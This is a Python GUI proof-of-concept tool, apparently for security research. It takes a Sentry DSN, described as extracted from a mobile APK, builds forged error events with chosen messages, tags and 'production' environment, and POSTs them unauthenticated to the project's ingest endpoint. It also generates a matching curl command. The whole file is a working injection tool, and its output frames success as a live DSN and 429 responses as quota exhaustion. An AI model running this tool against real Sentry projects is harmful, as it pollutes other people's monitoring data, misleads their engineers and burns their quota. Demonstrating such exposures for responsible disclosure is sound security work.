"""
Sentry DSN Exposure — PoC Tool
Generic GUI tool for demonstrating unauthenticated event injection
via an exposed Sentry DSN.

Usage:
    python sentry_dsn_poc.py

Requirements:
    pip install requests
    tkinter (bundled with Python on Windows/macOS; on Linux: sudo apt install python3-tk)
"""

import json
import re
import threading
import tkinter as tk
import uuid
from datetime import datetime, timezone
from tkinter import font as tkfont
from tkinter import messagebox, scrolledtext, ttk

try:
    import requests
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests


# ── Colour palette ────────────────────────────────────────────────────────────
BG       = "#1e1e2e"
SURFACE  = "#2a2a3e"
BORDER   = "#3a3a52"
ACCENT   = "#7c6af7"
ACCENT_H = "#9d8fff"
TEXT     = "#e0e0f0"
TEXT_MUT = "#888aaa"
RED      = "#e06c75"
GREEN    = "#98c379"
YELLOW   = "#e5c07b"
BLUE     = "#61afef"
MONO     = "Courier New"

LEVEL_COLORS = {
    "error":   RED,
    "fatal":   "#ff5f5f",
    "warning": YELLOW,
    "info":    BLUE,
    "debug":   TEXT_MUT,
}


# ── DSN parser ────────────────────────────────────────────────────────────────
def parse_dsn(dsn: str):
    """Return (key, org_slug, project_id, ingest_url) or raise ValueError."""
    dsn = dsn.strip()
    # Format: https://<key>@<host>/project_id
    m = re.match(r"https://([a-f0-9]+)@(o\d+\.ingest[^/]+)/(\d+)", dsn)
    if not m:
        raise ValueError("Invalid DSN format.\nExpected: https://<key>@<host>/<project_id>")
    key, host, project_id = m.groups()
    # derive org slug from host (o12345.ingest…)
    org_slug = host.split(".")[0]
    ingest_url = f"https://{host}/api/{project_id}/store/"
    return key, org_slug, project_id, ingest_url


# ── Main application ──────────────────────────────────────────────────────────
class SentryPoCApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Sentry DSN PoC Tool")
        self.configure(bg=BG)
        self.resizable(True, True)
        self.minsize(780, 680)

        self._setup_styles()
        self._build_ui()
        self.update_idletasks()
        self._center()

    # ── Window helpers ────────────────────────────────────────────────────────
    def _center(self):
        w, h = 900, 780
        sw = self.winfo_screenwidth()
        sh = self.winfo_screenheight()
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")

    # ── ttk styles ────────────────────────────────────────────────────────────
    def _setup_styles(self):
        s = ttk.Style(self)
        s.theme_use("clam")
        s.configure(".",
            background=BG, foreground=TEXT,
            fieldbackground=SURFACE, bordercolor=BORDER,
            troughcolor=BORDER, selectbackground=ACCENT,
            selectforeground=TEXT, font=("Segoe UI", 10))
        s.configure("TFrame",      background=BG)
        s.configure("Card.TFrame", background=SURFACE,
                    relief="flat", borderwidth=1)
        s.configure("TLabel",      background=BG, foreground=TEXT)
        s.configure("Muted.TLabel",background=BG, foreground=TEXT_MUT,
                    font=("Segoe UI", 9))
        s.configure("Header.TLabel",background=BG, foreground=TEXT,
                    font=("Segoe UI", 13, "bold"))
        s.configure("CardTitle.TLabel", background=SURFACE, foreground=ACCENT,
                    font=("Segoe UI", 9, "bold"))
        s.configure("TEntry",
            fieldbackground=SURFACE, foreground=TEXT,
            bordercolor=BORDER, insertcolor=TEXT, relief="flat",
            padding=(8, 5))
        s.map("TEntry",
            bordercolor=[("focus", ACCENT), ("!focus", BORDER)])
        s.configure("TCombobox",
            fieldbackground=SURFACE, foreground=TEXT,
            background=SURFACE, bordercolor=BORDER,
            arrowcolor=TEXT_MUT, relief="flat", padding=(8, 5))
        s.map("TCombobox",
            fieldbackground=[("readonly", SURFACE)],
            foreground=[("readonly", TEXT)],
            bordercolor=[("focus", ACCENT)])
        s.configure("Accent.TButton",
            background=ACCENT, foreground="#ffffff",
            bordercolor=ACCENT, relief="flat",
            font=("Segoe UI", 10, "bold"), padding=(14, 7))
        s.map("Accent.TButton",
            background=[("active", ACCENT_H), ("disabled", BORDER)],
            foreground=[("disabled", TEXT_MUT)])
        s.configure("Ghost.TButton",
            background=SURFACE, foreground=TEXT_MUT,
            bordercolor=BORDER, relief="flat",
            font=("Segoe UI", 9), padding=(8, 5))
        s.map("Ghost.TButton",
            background=[("active", BORDER)],
            foreground=[("active", TEXT)])
        s.configure("TNotebook", background=BG, bordercolor=BORDER, tabmargins=0)
        s.configure("TNotebook.Tab",
            background=SURFACE, foreground=TEXT_MUT,
            bordercolor=BORDER, padding=(14, 6),
            font=("Segoe UI", 9))
        s.map("TNotebook.Tab",
            background=[("selected", BG)],
            foreground=[("selected", TEXT)])
        s.configure("TLabelframe",
            background=SURFACE, foreground=TEXT_MUT,
            bordercolor=BORDER, relief="flat", padding=10)
        s.configure("TLabelframe.Label",
            background=SURFACE, foreground=ACCENT,
            font=("Segoe UI", 9, "bold"))
        s.configure("TScrollbar",
            background=SURFACE, troughcolor=BG,
            bordercolor=BORDER, arrowcolor=TEXT_MUT)
        s.configure("Horizontal.TSeparator", background=BORDER)

    # ── UI layout ─────────────────────────────────────────────────────────────
    def _build_ui(self):
        # top bar
        bar = tk.Frame(self, bg=SURFACE, height=48)
        bar.pack(fill="x")
        bar.pack_propagate(False)
        tk.Label(bar, text="  Sentry DSN  PoC Tool",
                 bg=SURFACE, fg=TEXT,
                 font=("Segoe UI", 12, "bold")).pack(side="left", padx=8, pady=8)
        tk.Label(bar, text="Security Research",
                 bg=SURFACE, fg=TEXT_MUT,
                 font=("Segoe UI", 9)).pack(side="right", padx=14)

        # separator line
        tk.Frame(self, bg=ACCENT, height=2).pack(fill="x")

        # main body
        body = ttk.Frame(self)
        body.pack(fill="both", expand=True, padx=18, pady=14)
        body.columnconfigure(0, weight=1)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(2, weight=1)

        # ── DSN card (full width) ──────────────────────────────────────────
        dsn_card = self._card(body, "DSN Configuration", colspan=2, row=0)
        dsn_card.columnconfigure(1, weight=1)

        self._lbl(dsn_card, "Sentry DSN *", 0, 0)
        self.dsn_var = tk.StringVar(value="")
        dsn_entry = ttk.Entry(dsn_card, textvariable=self.dsn_var, font=(MONO, 9))
        dsn_entry.grid(row=0, column=1, columnspan=3, sticky="ew", padx=(8,0), pady=3)
        self.dsn_var.trace_add("write", self._on_dsn_change)

        self._lbl(dsn_card, "Key (auto)", 1, 0)
        self.key_var = tk.StringVar()
        ttk.Entry(dsn_card, textvariable=self.key_var, state="readonly",
                  font=(MONO, 9)).grid(row=1, column=1, sticky="ew", padx=(8,8), pady=3)

        self._lbl(dsn_card, "Org", 1, 2)
        self.org_var = tk.StringVar()
        ttk.Entry(dsn_card, textvariable=self.org_var, state="readonly",
                  font=(MONO, 9), width=16).grid(row=1, column=3, sticky="ew", pady=3)

        self._lbl(dsn_card, "Project ID (auto)", 2, 0)
        self.proj_var = tk.StringVar()
        ttk.Entry(dsn_card, textvariable=self.proj_var, state="readonly",
                  font=(MONO, 9)).grid(row=2, column=1, sticky="ew", padx=(8,8), pady=3)

        self._lbl(dsn_card, "Ingest URL (auto)", 2, 2)
        self.url_var = tk.StringVar()
        ttk.Entry(dsn_card, textvariable=self.url_var, state="readonly",
                  font=(MONO, 9)).grid(row=2, column=3, sticky="ew", pady=3)

        dsn_card.columnconfigure(1, weight=2)
        dsn_card.columnconfigure(3, weight=2)

        # parse default DSN on load
        self._parse_dsn_fields()

        # ── Event card (left) ──────────────────────────────────────────────
        ev_card = self._card(body, "Event Payload", col=0, row=1)
        ev_card.columnconfigure(1, weight=1)

        self._lbl(ev_card, "Message *", 0, 0)
        self.msg_var = tk.StringVar(value="[PoC] Sentry DSN exposed in mobile APK")
        ttk.Entry(ev_card, textvariable=self.msg_var).grid(
            row=0, column=1, columnspan=3, sticky="ew", padx=(8,0), pady=3)

        self._lbl(ev_card, "Level", 1, 0)
        self.level_var = tk.StringVar(value="error")
        lvl = ttk.Combobox(ev_card, textvariable=self.level_var, width=12,
                           state="readonly",
                           values=["error","fatal","warning","info","debug"])
        lvl.grid(row=1, column=1, sticky="w", padx=(8,0), pady=3)

        self._lbl(ev_card, "Platform", 1, 2)
        self.platform_var = tk.StringVar(value="javascript")
        ttk.Combobox(ev_card, textvariable=self.platform_var, width=14,
                     values=["javascript","python","java","kotlin","swift",
                             "react-native","flutter","other"]).grid(
            row=1, column=3, sticky="w", pady=3)

        self._lbl(ev_card, "Logger", 2, 0)
        self.logger_var = tk.StringVar(value="security.poc")
        ttk.Entry(ev_card, textvariable=self.logger_var).grid(
            row=2, column=1, sticky="ew", padx=(8,0), pady=3)

        self._lbl(ev_card, "Release", 2, 2)
        self.release_var = tk.StringVar(value="")
        ttk.Entry(ev_card, textvariable=self.release_var,
                  ).grid(row=2, column=3, sticky="ew", pady=3)

        self._lbl(ev_card, "Environment", 3, 0)
        self.env_var = tk.StringVar(value="production")
        ttk.Combobox(ev_card, textvariable=self.env_var, width=14,
                     values=["production","staging","development","testing"]).grid(
            row=3, column=1, sticky="w", padx=(8,0), pady=3)

        self._lbl(ev_card, "Server name", 3, 2)
        self.server_var = tk.StringVar(value="")
        ttk.Entry(ev_card, textvariable=self.server_var).grid(
            row=3, column=3, sticky="ew", pady=3)

        self._lbl(ev_card, "Event ID", 4, 0)
        self.evid_var = tk.StringVar(value=uuid.uuid4().hex)
        ttk.Entry(ev_card, textvariable=self.evid_var,
                  font=(MONO, 9)).grid(row=4, column=1, sticky="ew", padx=(8,0), pady=3)
        ttk.Button(ev_card, text="New UUID", style="Ghost.TButton",
                   command=lambda: self.evid_var.set(uuid.uuid4().hex)).grid(
            row=4, column=3, sticky="w", pady=3)

        ev_card.columnconfigure(1, weight=2)
        ev_card.columnconfigure(3, weight=2)

        # ── Tags + Extra card (right) ──────────────────────────────────────
        te_card = self._card(body, "Tags & Extra", col=1, row=1)

        ttk.Label(te_card, text="Tags  (key=value, one per line)",
                  style="CardTitle.TLabel").pack(anchor="w", pady=(0,4))
        self.tags_txt = self._text_area(te_card, height=5,
            default="poc=true\nfinding=DSN-EXPOSURE")

        ttk.Label(te_card, text="Extra  (key=value, one per line)",
                  style="CardTitle.TLabel").pack(anchor="w", pady=(10,4))
        self.extra_txt = self._text_area(te_card, height=5,
            default="note=DSN extracted from mobile APK bundle\ntool=sentry-dsn-poc")

        # ── Response pane (full width) ─────────────────────────────────────
        resp_card = self._card(body, "Response", colspan=2, row=2, expand=True)

        btn_row = ttk.Frame(resp_card, style="Card.TFrame")
        btn_row.pack(fill="x", pady=(0,8))

        self.send_btn = ttk.Button(btn_row, text="▶  Send Event",
                                   style="Accent.TButton",
                                   command=self._send_threaded)
        self.send_btn.pack(side="left")

        self.gen_curl_btn = ttk.Button(btn_row, text="Generate curl",
                                       style="Ghost.TButton",
                                       command=self._show_curl)
        self.gen_curl_btn.pack(side="left", padx=(8,0))

        ttk.Button(btn_row, text="Clear", style="Ghost.TButton",
                   command=self._clear_resp).pack(side="left", padx=(8,0))

        self.status_lbl = tk.Label(btn_row, text="",
                                   bg=SURFACE, fg=TEXT_MUT,
                                   font=("Segoe UI", 9))
        self.status_lbl.pack(side="right", padx=4)

        self.resp_box = scrolledtext.ScrolledText(
            resp_card, height=10, bg=BG, fg=TEXT,
            font=(MONO, 9), insertbackground=TEXT,
            selectbackground=ACCENT, relief="flat",
            bd=1, highlightthickness=1,
            highlightbackground=BORDER,
            highlightcolor=ACCENT)
        self.resp_box.pack(fill="both", expand=True)
        self.resp_box.configure(state="disabled")

        # tags for colouring output
        self.resp_box.tag_config("ok",      foreground=GREEN)
        self.resp_box.tag_config("err",     foreground=RED)
        self.resp_box.tag_config("warn",    foreground=YELLOW)
        self.resp_box.tag_config("dim",     foreground=TEXT_MUT)
        self.resp_box.tag_config("key",     foreground=BLUE)
        self.resp_box.tag_config("val",     foreground=TEXT)

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _card(self, parent, title, col=0, row=0, colspan=1, expand=False):
        outer = ttk.Frame(parent, style="Card.TFrame", padding=14)
        sticky = "nsew" if expand else "new"
        outer.grid(row=row, column=col, columnspan=colspan,
                   sticky=sticky, padx=(0,8) if col==0 and colspan==1 else 0,
                   pady=(0,10))
        if expand:
            parent.rowconfigure(row, weight=1)
        tk.Label(outer, text=title.upper(), bg=SURFACE, fg=ACCENT,
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(0,8))
        inner = tk.Frame(outer, bg=SURFACE)
        inner.pack(fill="both", expand=True)
        return inner

    def _lbl(self, parent, text, row, col):
        tk.Label(parent, text=text, bg=SURFACE, fg=TEXT_MUT,
                 font=("Segoe UI", 9), anchor="w").grid(
            row=row, column=col, sticky="w", padx=(0,4), pady=3)

    def _text_area(self, parent, height=5, default=""):
        f = tk.Frame(parent, bg=BORDER, bd=1)
        f.pack(fill="x")
        t = tk.Text(f, height=height, bg=SURFACE, fg=TEXT,
                    font=(MONO, 9), insertbackground=TEXT,
                    selectbackground=ACCENT, relief="flat", bd=6,
                    wrap="word")
        t.pack(fill="both")
        if default:
            t.insert("1.0", default)
        return t

    # ── DSN parsing ───────────────────────────────────────────────────────────
    def _on_dsn_change(self, *_):
        self._parse_dsn_fields()

    def _parse_dsn_fields(self):
        try:
            key, org, proj, url = parse_dsn(self.dsn_var.get())
            self.key_var.set(key)
            self.org_var.set(org)
            self.proj_var.set(proj)
            self.url_var.set(url)
        except Exception:
            self.key_var.set("─")
            self.org_var.set("─")
            self.proj_var.set("─")
            self.url_var.set("─")

    # ── Payload builder ───────────────────────────────────────────────────────
    def _build_payload(self):
        def parse_kv(text_widget):
            d = {}
            for line in text_widget.get("1.0", "end").splitlines():
                line = line.strip()
                if "=" in line:
                    k, _, v = line.partition("=")
                    d[k.strip()] = v.strip()
            return d

        payload = {
            "event_id":   self.evid_var.get().strip() or uuid.uuid4().hex,
            "timestamp":  datetime.now(timezone.utc).isoformat(),
            "platform":   self.platform_var.get(),
            "level":      self.level_var.get(),
            "logger":     self.logger_var.get(),
            "message":    self.msg_var.get(),
        }

        env = self.env_var.get().strip()
        if env:
            payload["environment"] = env
        release = self.release_var.get().strip()
        if release:
            payload["release"] = release
        server = self.server_var.get().strip()
        if server:
            payload["server_name"] = server

        tags = parse_kv(self.tags_txt)
        if tags:
            payload["tags"] = tags

        extra = parse_kv(self.extra_txt)
        if extra:
            payload["extra"] = extra

        return payload

    def _build_headers(self, key):
        return {
            "Content-Type": "application/json",
            "X-Sentry-Auth": (
                f"Sentry sentry_version=7, "
                f"sentry_client=sentry-dsn-poc/1.0, "
                f"sentry_key={key}"
            ),
        }

    # ── Send ──────────────────────────────────────────────────────────────────
    def _send_threaded(self):
        try:
            key, _, _, url = parse_dsn(self.dsn_var.get())
        except ValueError as e:
            messagebox.showerror("Invalid DSN", str(e))
            return

        self.send_btn.configure(state="disabled", text="Sending…")
        self._set_status("Sending…", TEXT_MUT)
        self._write_resp("", clear=True)
        threading.Thread(target=self._do_send,
                         args=(key, url), daemon=True).start()

    def _do_send(self, key, url):
        payload  = self._build_payload()
        headers  = self._build_headers(key)
        ts       = datetime.now().strftime("%H:%M:%S")

        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=12)
            self.after(0, self._on_response, resp, payload, headers, url, ts)
        except requests.exceptions.ConnectionError:
            self.after(0, self._on_error,
                       "Connection error — could not reach Sentry ingest endpoint.\n"
                       "Check network connectivity and the DSN host.")
        except requests.exceptions.Timeout:
            self.after(0, self._on_error, "Request timed out after 12 seconds.")
        except Exception as e:
            self.after(0, self._on_error, str(e))
        finally:
            self.after(0, self._reset_btn)

    def _on_response(self, resp, payload, headers, url, ts):
        lines = []

        # status line
        ok = resp.ok
        sc = resp.status_code
        color = "ok" if ok else ("warn" if sc in (400, 429) else "err")

        lines.append((f"[{ts}]  HTTP {sc}  {resp.reason}\n", color))
        lines.append((f"{'─'*60}\n", "dim"))

        # request summary
        lines.append(("REQUEST\n", "key"))
        lines.append((f"  POST  {url}\n", "dim"))
        lines.append((f"  X-Sentry-Auth: {headers['X-Sentry-Auth']}\n\n", "dim"))

        # response body
        lines.append(("RESPONSE BODY\n", "key"))
        try:
            body = resp.json()
            lines.append((json.dumps(body, indent=2) + "\n\n", "val"))
        except Exception:
            lines.append((resp.text[:2000] + "\n\n", "val"))

        # interpretation
        lines.append(("INTERPRETATION\n", "key"))
        if ok:
            event_id = ""
            try:
                event_id = resp.json().get("id", "")
            except Exception:
                pass
            lines.append(("  ✓  DSN IS LIVE — event injected successfully.\n", "ok"))
            if event_id:
                lines.append((f"  ✓  Event ID: {event_id}\n", "ok"))
            lines.append(("  ✓  This event is now visible inside the Sentry project dashboard.\n", "ok"))
            lines.append(("  ✓  No authentication required — DSN accepted unauthenticated POST.\n", "ok"))
            self._set_status("✓  Event injected — DSN is live", GREEN)
        elif sc == 401:
            lines.append(("  ✗  401 Unauthorized — DSN key has been revoked or is invalid.\n", "warn"))
            lines.append(("     The DSN is no longer active. Confirm rotation was applied\n", "dim"))
            lines.append(("     to all build variants (debug / release / staging).\n", "dim"))
            self._set_status("DSN revoked (401)", YELLOW)
        elif sc == 403:
            lines.append(("  ✗  403 Forbidden — origin restriction in place or key disabled.\n", "warn"))
            self._set_status("Forbidden (403)", YELLOW)
        elif sc == 429:
            lines.append(("  ⚠  429 Rate Limited — DSN is live but Sentry is throttling.\n", "warn"))
            lines.append(("     This itself demonstrates the quota-exhaustion risk.\n", "dim"))
            self._set_status("Rate limited (429) — DSN live", YELLOW)
        elif sc == 400:
            lines.append(("  ⚠  400 Bad Request — DSN accepted but payload was malformed.\n", "warn"))
            lines.append(("     Adjust the event fields and retry.\n", "dim"))
            self._set_status("Bad Request (400)", YELLOW)
        else:
            lines.append((f"  ?  Unexpected status {sc}.\n", "warn"))
            self._set_status(f"Unexpected: HTTP {sc}", YELLOW)

        # raw payload
        lines.append(("\nSENT PAYLOAD\n", "key"))
        lines.append((json.dumps(payload, indent=2) + "\n", "dim"))

        self._write_resp_lines(lines)

    def _on_error(self, msg):
        self._write_resp_lines([
            (f"ERROR\n{'─'*60}\n", "err"),
            (msg + "\n", "err"),
        ])
        self._set_status("Error", RED)

    def _reset_btn(self):
        self.send_btn.configure(state="normal", text="▶  Send Event")

    # ── curl generator ────────────────────────────────────────────────────────
    def _show_curl(self):
        try:
            key, _, _, url = parse_dsn(self.dsn_var.get())
        except ValueError as e:
            messagebox.showerror("Invalid DSN", str(e))
            return

        payload = self._build_payload()
        headers = self._build_headers(key)
        h_str = "\n".join(
            f"  -H '{k}: {v}' \\" for k, v in headers.items()
        )
        body = json.dumps(payload, indent=2)

        curl = (
            f"curl -X POST \\\n"
            f"  '{url}' \\\n"
            f"{h_str}\n"
            f"  -d '{body}'"
        )

        win = tk.Toplevel(self)
        win.title("curl command")
        win.configure(bg=BG)
        win.geometry("720x420")

        tk.Label(win, text="Copy and run from your terminal",
                 bg=BG, fg=TEXT_MUT, font=("Segoe UI", 9)).pack(padx=14, pady=(12,4), anchor="w")

        box = scrolledtext.ScrolledText(
            win, bg=SURFACE, fg=GREEN, font=(MONO, 9),
            relief="flat", bd=0, insertbackground=TEXT)
        box.pack(fill="both", expand=True, padx=14, pady=(0,8))
        box.insert("1.0", curl)
        box.configure(state="disabled")

        ttk.Button(win, text="Close", style="Ghost.TButton",
                   command=win.destroy).pack(pady=(0,12))

    # ── Output helpers ────────────────────────────────────────────────────────
    def _write_resp(self, text, clear=False, tag="val"):
        self.resp_box.configure(state="normal")
        if clear:
            self.resp_box.delete("1.0", "end")
        if text:
            self.resp_box.insert("end", text, tag)
        self.resp_box.configure(state="disabled")
        self.resp_box.see("end")

    def _write_resp_lines(self, lines):
        self.resp_box.configure(state="normal")
        self.resp_box.delete("1.0", "end")
        for text, tag in lines:
            self.resp_box.insert("end", text, tag)
        self.resp_box.configure(state="disabled")
        self.resp_box.see("1.0")

    def _clear_resp(self):
        self._write_resp("", clear=True)
        self._set_status("", TEXT_MUT)

    def _set_status(self, msg, color=TEXT_MUT):
        self.status_lbl.configure(text=msg, fg=color)


if __name__ == "__main__":
    app = SentryPoCApp()
    app.mainloop()
